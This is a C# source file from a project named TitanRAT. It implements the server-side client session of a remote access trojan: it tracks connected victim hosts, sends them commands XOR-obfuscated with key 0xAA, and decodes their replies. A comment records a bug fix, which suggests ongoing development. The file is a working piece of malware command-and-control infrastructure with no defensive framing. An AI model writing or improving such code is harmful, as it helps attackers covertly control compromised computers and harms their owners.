// Server/ClientSession.cs — ИСПРАВЛЕННЫЙ (ReadAsync вместо ReadByteAsync)
using System.Net.Sockets;
using System.Text;

namespace TitanRAT.Server;

public class ClientSession
{
    public string Id { get; }
    public string Hostname { get; set; }
    public DateTime LastSeen { get; set; }
    
    private readonly TcpClient _client;
    private readonly NetworkStream _stream;
    private const byte XOR_KEY = 0xAA;
    private const byte XOR_NEWLINE = 0x0A ^ XOR_KEY; // 0xA0
    
    public ClientSession(string id, TcpClient client)
    {
        Id = id;
        Hostname = "Unknown";
        LastSeen = DateTime.UtcNow;
        _client = client;
        _stream = client.GetStream();
    }
    
    public async Task SendCommandAsync(string command)
    {
        try
        {
            var plaintext = command + "\n";
            var bytes = Encoding.UTF8.GetBytes(plaintext);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= XOR_KEY;
            await _stream.WriteAsync(bytes, 0, bytes.Length);
        }
        catch { /* Client disconnected */ }
    }
    
    public async Task<string?> ReadLineAsync()
    {
        var buffer = new List<byte>();
        var singleByte = new byte[1];
        
        try
        {
            while (true)
            {
                // Read exactly one byte
                int read = await _stream.ReadAsync(singleByte, 0, 1);
                if (read == 0) return null; // EOF / disconnected
                
                byte b = singleByte[0];
                
                // Check for XORed newline delimiter
                if (b == XOR_NEWLINE)
                {
                    var bytes = buffer.ToArray();
                    for (int i = 0; i < bytes.Length; i++) bytes[i] ^= XOR_KEY;
                    return Encoding.UTF8.GetString(bytes);
                }
                
                buffer.Add(b);
                
                // Safety limit
                if (buffer.Count > 8192) return null;
            }
        }
        catch { return null; }
    }
    
    public void Close()
    {
        try { _stream?.Dispose(); _client?.Close(); }
        catch { }
    }
}